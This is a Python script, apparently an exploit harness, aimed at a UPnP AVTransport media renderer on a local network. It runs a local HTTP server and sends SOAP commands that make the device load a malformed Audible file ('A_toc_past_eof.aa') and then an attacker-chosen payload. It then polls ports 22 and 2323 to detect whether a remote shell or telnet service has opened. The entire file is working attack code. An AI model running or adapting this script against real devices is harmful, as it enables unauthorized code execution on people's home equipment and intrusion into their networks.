#!/usr/bin/env python3
import subprocess, threading, http.server, socketserver, os, time, sys, urllib.request
IP="192.168.4.135"; HOST="192.168.4.160"; PORT=8979
SVC="urn:schemas-upnp-org:service:AVTransport:1"; CTL=f"http://{IP}:1400/MediaRenderer/AVTransport/Control"
PROTO="http-get:*:audio/aac:*"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        p=f"recon/tnzm_audible/sweep2/{self.path.split('?')[0].lstrip('/')}"
        data=open(p,"rb").read() if os.path.exists(p) else b"x"
        self.send_response(200); self.send_header("Content-Length",str(len(data))); self.end_headers(); self.wfile.write(data)
    def log_message(self,*a): pass
def soap(action,extra=""):
    body=('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
          f'<u:{action} xmlns:u="{SVC}"><InstanceID>0</InstanceID>{extra}</u:{action}></s:Body></s:Envelope>')
    r=subprocess.run(["curl","-s","-m","15","-X","POST","-H",'Content-Type: text/xml; charset="utf-8"',"-H",f'SOAPACTION: "{SVC}#{action}"',"--data-binary",body,CTL],capture_output=True,text=True)
    import re
    m=re.search(r"errorCode>(\d+)<",r.stdout)
    return f"ERR{m.group(1)}" if m else "200"
def didl(url):
    return ('&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/"&gt;&lt;item id="-1" parentID="-1" restricted="true"&gt;&lt;dc:title&gt;t&lt;/dc:title&gt;&lt;upnp:class&gt;object.item.audioItem.musicTrack&lt;/upnp:class&gt;&lt;res protocolInfo="'+PROTO+'"&gt;'+url+'&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;')
def setav(path):
    url=f"http://{HOST}:{PORT}/{path}"
    return soap("SetAVTransportURI",f"<CurrentURI>{url}</CurrentURI><CurrentURIMetaData>{didl(url)}</CurrentURIMetaData>")
def port(p):
    r=subprocess.run(["nc","-z","-G","3",IP,str(p)],capture_output=True,text=True)
    return r.returncode==0
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda: socketserver.TCPServer((HOST,PORT),H).serve_forever(),daemon=True).start()
soap("Stop")
payload=sys.argv[1]
c1=setav("A_toc_past_eof.aa"); soap("Play","<Speed>1</Speed>"); time.sleep(1.5)
c2=setav(payload); soap("Play","<Speed>1</Speed>")
print(f"fired {payload} (s1={c1} s2={c2})",flush=True)
for i in range(40):
    time.sleep(5)
    p22,p23=port(22),port(2323)
    if p22 or p23:
        print(f"PORT {'22' if p22 else ''}{'2323' if p23 else ''} OPEN after {(i+1)*5}s",flush=True)
        sys.exit(0)
    if i%4==3: print(f"  {(i+1)*5}s: 22={p22} 2323={p23}",flush=True)
print("no port in 200s",flush=True)
